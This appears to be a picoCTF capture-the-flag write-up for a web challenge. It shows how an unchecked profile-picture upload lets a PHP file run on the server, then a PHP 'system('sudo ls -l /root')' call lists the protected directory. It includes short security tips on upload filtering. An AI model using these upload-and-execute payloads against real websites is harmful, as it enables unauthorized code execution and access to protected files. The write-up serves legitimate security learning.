---
tags:
    - picoCTF
    - web-exploitation
---

# No Sanity


A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.

## Reading the challenge hints

- no sanity; likely no input sanitisation
- focus is the upload functionality
- difficulty of the cahllenge is basic; so look for web exploits
- process given
    1. locate file upload area
    1. Find flag in `/root`

## Research

- [bing search](https://letmegooglethat.com/?q=web+hacking+file+uploads+not+sanisiting)
- [likely hit](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/)

So maybe the site may not check file upload type, and allow us to upload executable content to the server

!!! note "Security practice tip!"

    A secure web server will check file extension and file type and block unapproved types!.

## Testing the idea

### Test a file upload of a txt file

Create a php file to test our theory

```php
<?php
// Get the current working directory
$currentDirectory = getcwd();
// Display the current working directory
echo "The present working directory is: " . $currentDirectory;
?>
```

Response looks good! `The file cwd.php has been uploaded Path: uploads/cwd.php`



Now browse there...

Success!

So we have:

```mermaid
sequenceDiagram
    client->>server: uploads file
    server->>client: ok, and heres where it went!
    client-)server: can i see my file pls?
    server-->>client: sure!
    server-->>client: its executable, ok i will execute it...
    server->>client: here's my response

```

## Now can we just list /root?

Lets mak a php script to list a directory; from bing ai code generator:

```php
<?php
$directory = '/root';
foreach (new DirectoryIterator($directory) as $fileInfo) {
    if (!$fileInfo->isDot()) {
        echo $fileInfo->getFilename() . PHP_EOL;
    }
}
?>
```

Hmm, no permissions

## Ok sudo list me root

Lets try this as a system call. 

!!! note "Security practice tip!"

    A secure web server will block system calls in the php config.

```php
<?php
system('sudo ls -l /root'); // Replace 'ls -l' with your desired command
?>
```

Success!

Ok now try and get the contents of the flag!